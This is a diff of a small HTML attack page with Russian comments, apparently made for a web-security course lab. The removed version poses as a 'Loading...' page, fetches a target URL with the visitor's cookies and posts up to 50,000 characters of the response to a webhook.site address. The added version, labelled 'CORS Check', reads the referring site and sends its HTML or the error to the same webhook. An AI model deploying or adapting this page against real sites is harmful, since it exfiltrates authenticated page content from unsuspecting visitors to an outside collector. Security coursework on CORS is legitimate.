@@ -1,54 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
+<head><title>CORS Check</title></head>
 <body>
-    <h1>Please wait...</h1>
+    <h1>Checking target...</h1>
+    <pre id="log"></pre>
     <script>
-        // Получаем целевой URL из параметра
-        const targetUrl = new URLSearchParams(window.location.search).get('url') || 'http://localhost';
+        const webhook = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
+        const log = document.getElementById('log');
         
-        // Замени на свой webhook URL с webhook.site
-        const webhookUrl = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
+        // Берем сайт, с которого пришел пользователь, или указываем вручную
+        const target = document.referrer || 'https://cats.is-course.ru';
         
-        fetch(targetUrl, {
-            method: 'GET',
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(html => {
-            // Отправляем данные на webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    target_url: targetUrl,
-                    html_content: html.substring(0, 50000), // ограничиваем размер
-                    timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent
-                })
+        log.textContent = `Пытаемся прочитать: ${target}\n`;
+
+        fetch(target, { method: 'GET', mode: 'cors' })
+            .then(res => {
+                log.textContent += `✅ УСПЕХ! Статус: ${res.status}\n`;
+                log.textContent += `CORS разрешает чтение этого сайта!\n`;
+                return res.text();
             })
-            .then(() => {
-                document.body.innerHTML = '<h1>Data sent successfully!</h1>';
+            .then(html => {
+                log.textContent += `Длина HTML: ${html.length} байт.\n`;
+                // Отправляем первые 2000 символов тебе
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        source: 'CORS_SUCCESS',
+                        target: target,
+                        html_snippet: html.substring(0, 2000)
+                    })
+                });
             })
             .catch(err => {
-                document.body.innerHTML = '<h1>Error sending data</h1><p>' + err + '</p>';
+                log.textContent += `❌ ПРОВАЛ. Ошибка: ${err.message}\n`;
+                log.textContent += `Это значит, что CORS закрыт. Прочитать HTML через браузер НЕВОЗМОЖНО.`;
+                
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        source: 'CORS_BLOCKED',
+                        target: target,
+                        error: err.message
+                    })
+                });
             });
-        })
-        .catch(err => {
-            document.body.innerHTML = '<h1>Error fetching target</h1><p>' + err + '</p>';
-            // Даже если не получилось получить HTML, отправляем ошибку
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    error: err.toString(),
-                    target_url: targetUrl,
-                    timestamp: new Date().toISOString()
-                })
-            });
-        });
     </script>
 </body>
 </html>
